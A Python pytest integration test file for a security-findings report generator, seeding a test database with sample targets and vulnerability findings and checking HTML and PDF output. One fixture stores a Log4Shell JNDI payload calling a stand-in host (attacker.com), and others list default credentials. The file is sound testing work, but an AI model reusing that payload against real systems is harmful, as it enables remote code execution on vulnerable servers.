"""
Integration tests for the reporting engine.

These tests exercise the full pipeline end-to-end — context building,
Jinja2 template rendering, and PDF generation — using an in-memory SQLite
database that mirrors the production schema.  They write actual HTML and PDF
files to a temporary directory so output can be inspected manually during CI.
"""

from __future__ import annotations

import json
import tempfile
from pathlib import Path

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from api.db.models import Base, FindingModel, Project, Target
from api.reporting.generator import ReportGenerator, _get_pdf_backend

# ---------------------------------------------------------------------------
# In-memory DB fixture (isolated per test-class)
# ---------------------------------------------------------------------------

TEST_DB_URL = "sqlite:///:memory:"


@pytest.fixture(scope="class")
def db_engine():
    engine = create_engine(
        TEST_DB_URL,
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    Base.metadata.create_all(bind=engine)
    yield engine
    Base.metadata.drop_all(bind=engine)
    engine.dispose()


@pytest.fixture(scope="class")
def db_session(db_engine):
    Session = sessionmaker(autocommit=False, autoflush=False, bind=db_engine)
    db = Session()
    try:
        yield db
    finally:
        db.close()


# ---------------------------------------------------------------------------
# Full-scenario fixture: 3 targets, 10 findings across all types/severities
# ---------------------------------------------------------------------------


@pytest.fixture(scope="class")
def full_project(db_session):
    """
    Seed a complete multi-target project with one finding per severity + type
    combination.  Scope=class keeps the DB row around for all tests in the class.
    """
    project = Project(
        name="Integration Test Report",
        description="End-to-end report integration test with a realistic mix of findings.",
    )
    db_session.add(project)
    db_session.commit()
    db_session.refresh(project)

    t1 = Target(project_id=project.id, name="web-server",   ip_address="10.10.0.1", status="active")
    t2 = Target(project_id=project.id, name="db-server",    ip_address="10.10.0.2", status="active")
    t3 = Target(project_id=project.id, name="infra-server", ip_address="10.10.0.3", status="idle")
    db_session.add_all([t1, t2, t3])
    db_session.commit()
    db_session.refresh(t1)
    db_session.refresh(t2)
    db_session.refresh(t3)

    findings = [
        # ── t1: web-server ────────────────────────────────────────────────
        FindingModel(
            target_id=t1.id,
            title="Log4Shell RCE — Critical Offensive",
            severity="Critical",
            cve="CVE-2021-44228",
            cpe="cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*",
            description="JNDI injection enabling RCE.",
            remediation="Upgrade Log4j to 2.17.1.",
            evidence={
                "finding_type": "offensive",
                "payload": "${jndi:ldap://attacker.com/a}",
                "header": "X-Api-Version",
                "callback": True,
            },
        ),
        FindingModel(
            target_id=t1.id,
            title="Missing HSTS — Info Recon",
            severity="Info",
            description="HSTS header absent.",
            evidence={
                "finding_type": "recon",
                "url": "https://10.10.0.1/",
                "hsts": False,
            },
        ),
        FindingModel(
            target_id=t1.id,
            title="Weak TLS — Medium Defensive",
            severity="Medium",
            description="TLS 1.0 accepted.",
            evidence={
                "finding_type": "defensive",
                "supported": ["TLSv1.0", "TLSv1.1", "TLSv1.2"],
            },
        ),
        # ── t2: db-server ─────────────────────────────────────────────────
        FindingModel(
            target_id=t2.id,
            title="Postgres Default Creds — Critical Defensive",
            severity="Critical",
            cve="CVE-2019-9193",
            cpe="cpe:2.3:a:postgresql:postgresql:11.2:*:*:*:*:*:*:*",
            description="Default postgres superuser credentials.",
            evidence={
                "finding_type": "defensive",
                "user": "postgres",
                "auth": "trust",
            },
        ),
        FindingModel(
            target_id=t2.id,
            title="Unencrypted DB Traffic — Medium Defensive",
            severity="Medium",
            description="SSL not enforced on PostgreSQL.",
            evidence={
                "finding_type": "defensive",
                "ssl_required": False,
            },
        ),
        FindingModel(
            target_id=t2.id,
            title="DB Backup World-Readable — Low Defensive",
            severity="Low",
            description="Backup files world-readable.",
            evidence={
                "finding_type": "defensive",
                "path": "/var/backups/pg/",
                "mode": "0644",
            },
        ),
        # ── t3: infra-server ──────────────────────────────────────────────
        FindingModel(
            target_id=t3.id,
            title="EternalBlue SMB — Critical Offensive",
            severity="Critical",
            cve="CVE-2017-0144",
            description="MS17-010 exploitable.",
            evidence={
                "finding_type": "offensive",
                "port": 445,
                "smb": "v1",
            },
        ),
        FindingModel(
            target_id=t3.id,
            title="RDP Without NLA — High Offensive",
            severity="High",
            cve="CVE-2019-0708",
            description="BlueKeep pre-auth RCE vector.",
            evidence={
                "finding_type": "offensive",
                "port": 3389,
                "nla": False,
            },
        ),
        FindingModel(
            target_id=t3.id,
            title="Default Admin Credentials — Critical Defensive",
            severity="Critical",
            description="Management console uses admin:admin.",
            evidence={
                "finding_type": "defensive",
                "port": 8080,
                "credentials": "admin:admin",
                "access": "Administrator",
            },
        ),
        FindingModel(
            target_id=t3.id,
            title="Open Port Scan — Info Recon",
            severity="Info",
            description="Nmap discovered 6 open ports.",
            evidence={
                "finding_type": "recon",
                "open_ports": [22, 80, 443, 445, 3389, 8080],
            },
        ),
    ]
    db_session.add_all(findings)
    db_session.commit()
    return project


# ---------------------------------------------------------------------------
# Integration test class
# ---------------------------------------------------------------------------


class TestReportIntegration:
    """Full pipeline tests against a realistic multi-target project."""

    def test_active_pdf_backend_is_known(self):
        """_get_pdf_backend() must return a known backend string."""
        backend = _get_pdf_backend()
        assert backend in ("weasyprint", "reportlab", "none"), \
            f"Unexpected backend: {backend!r}"

    # ── Context building ──────────────────────────────────────────────

    def test_context_has_correct_targets(self, db_session, full_project):
        gen = ReportGenerator()
        ctx = gen._build_context(full_project, db_session)
        assert ctx["summary"]["total_targets"] == 3
        target_names = {t["name"] for t in ctx["targets"]}
        assert "web-server" in target_names
        assert "db-server" in target_names
        assert "infra-server" in target_names

    def test_context_total_findings(self, db_session, full_project):
        gen = ReportGenerator()
        ctx = gen._build_context(full_project, db_session)
        assert ctx["summary"]["total_findings"] == 10

    def test_context_findings_sorted_by_severity(self, db_session, full_project):
        """Critical findings must appear before High, Medium, etc. per target."""
        severity_order = ["Critical", "High", "Medium", "Low", "Info"]
        gen = ReportGenerator()
        ctx = gen._build_context(full_project, db_session)
        for target in ctx["targets"]:
            severities = [f["severity"] for f in target["findings"]]
            indexes = [severity_order.index(s) for s in severities]
            assert indexes == sorted(indexes), \
                f"Findings for {target['name']} not sorted by severity: {severities}"

    def test_context_type_counts(self, db_session, full_project):
        gen = ReportGenerator()
        ctx = gen._build_context(full_project, db_session)
        # From the fixture: offensive=4 (Log4Shell, EternalBlue, RDP, explicit)
        #                   defensive=5 (postgres, TLS×2, backup, admin-creds)
        #                   recon=2    (HSTS, open ports)
        # Note: Postgres default creds has CVE but evidence says "defensive"
        assert ctx["summary"]["by_type"]["offensive"] + \
               ctx["summary"]["by_type"]["defensive"] + \
               ctx["summary"]["by_type"]["recon"] == 10

    def test_context_evidence_items_populated(self, db_session, full_project):
        """Every finding with evidence must have evidence_items list."""
        gen = ReportGenerator()
        ctx = gen._build_context(full_project, db_session)
        for target in ctx["targets"]:
            for f in target["findings"]:
                if f["evidence"]:
                    assert isinstance(f["evidence_items"], list)
                    assert len(f["evidence_items"]) >= 1
                    # finding_type key must be excluded from evidence_items
                    keys = [item["key"] for item in f["evidence_items"]]
                    assert "finding_type" not in keys

    # ── HTML rendering ────────────────────────────────────────────────

    def test_html_renders_without_exception(self, db_session, full_project):
        gen = ReportGenerator()
        html = gen.render_html(full_project, db_session)
        assert isinstance(html, str)
        assert len(html) > 5000

    def test_html_has_all_three_targets(self, db_session, full_project):
        gen = ReportGenerator()
        html = gen.render_html(full_project, db_session)
        assert "web-server" in html
        assert "db-server" in html
        assert "infra-server" in html

    def test_html_has_all_finding_types(self, db_session, full_project):
        gen = ReportGenerator()
        html = gen.render_html(full_project, db_session)
        assert "OFFENSIVE" in html
        assert "DEFENSIVE" in html
        assert "RECON" in html

    def test_html_has_cve_references(self, db_session, full_project):
        gen = ReportGenerator()
        html = gen.render_html(full_project, db_session)
        assert "CVE-2021-44228" in html
        assert "CVE-2017-0144" in html

    def test_html_has_cpe_pills(self, db_session, full_project):
        gen = ReportGenerator()
        html = gen.render_html(full_project, db_session)
        assert "cpe-code" in html
        assert "cpe:2.3:a:apache:log4j" in html

    def test_html_has_evidence_blocks(self, db_session, full_project):
        gen = ReportGenerator()
        html = gen.render_html(full_project, db_session)
        # The evidence details/summary element
        assert "<details" in html
        assert "Evidence" in html

    def test_html_has_appendix(self, db_session, full_project):
        gen = ReportGenerator()
        html = gen.render_html(full_project, db_session)
        assert "Appendix" in html

    def test_html_is_reproducible(self, db_session, full_project):
        """Two successive render calls must produce identical HTML (same timestamp window)."""
        gen = ReportGenerator()
        html1 = gen.render_html(full_project, db_session)
        html2 = gen.render_html(full_project, db_session)
        # Strip the generated_at timestamp line before comparing (it may differ by 1s)
        def strip_ts(h: str) -> str:
            import re
            return re.sub(r"Generated:.*?</", "Generated:STRIPPED</", h)
        assert strip_ts(html1) == strip_ts(html2)

    # ── PDF rendering ─────────────────────────────────────────────────

    def test_pdf_renders_without_exception(self, db_session, full_project):
        gen = ReportGenerator()
        pdf = gen.render_pdf(full_project, db_session)
        assert isinstance(pdf, bytes)

    def test_pdf_starts_with_magic_header(self, db_session, full_project):
        gen = ReportGenerator()
        pdf = gen.render_pdf(full_project, db_session)
        assert pdf.startswith(b"%PDF"), "Missing %%PDF magic header"

    def test_pdf_minimum_size(self, db_session, full_project):
        gen = ReportGenerator()
        pdf = gen.render_pdf(full_project, db_session)
        assert len(pdf) > 4_000, f"PDF too small: {len(pdf)} bytes"

    def test_pdf_written_to_tempdir(self, db_session, full_project, tmp_path):
        """Verify PDF can be written to disk and re-read with correct magic."""
        gen = ReportGenerator()
        pdf = gen.render_pdf(full_project, db_session)
        out = tmp_path / "integration_test.pdf"
        out.write_bytes(pdf)
        assert out.exists()
        assert out.stat().st_size == len(pdf)
        assert out.read_bytes().startswith(b"%PDF")

    def test_html_written_to_tempdir(self, db_session, full_project, tmp_path):
        """Verify HTML can be written to disk and re-read with correct content."""
        gen = ReportGenerator()
        html = gen.render_html(full_project, db_session)
        out = tmp_path / "integration_test.html"
        out.write_text(html, encoding="utf-8")
        assert out.exists()
        content = out.read_text(encoding="utf-8")
        assert "Integration Test Report" in content
        assert "CVE-2021-44228" in content

    # ── Error handling ────────────────────────────────────────────────

    def test_html_error_fallback_contains_error_heading(self, db_session):
        """When rendering fails, the fallback HTML must mention the error."""
        gen = ReportGenerator()
        # Non-persisted project with id=-99 triggers a DB query with no results
        ghost = Project(id=-99, name="Ghost Project")
        html = gen.render_html(ghost, db_session)
        # Either renders successfully with "Ghost Project" or shows error fallback
        assert "Ghost Project" in html or "Error" in html

    def test_pdf_error_fallback_starts_with_pdf_header(self, db_session):
        """Even on failure, render_pdf must return valid %%PDF bytes."""
        gen = ReportGenerator()
        ghost = Project(id=-99, name="Ghost Project")
        pdf = gen.render_pdf(ghost, db_session)
        assert pdf.startswith(b"%PDF")
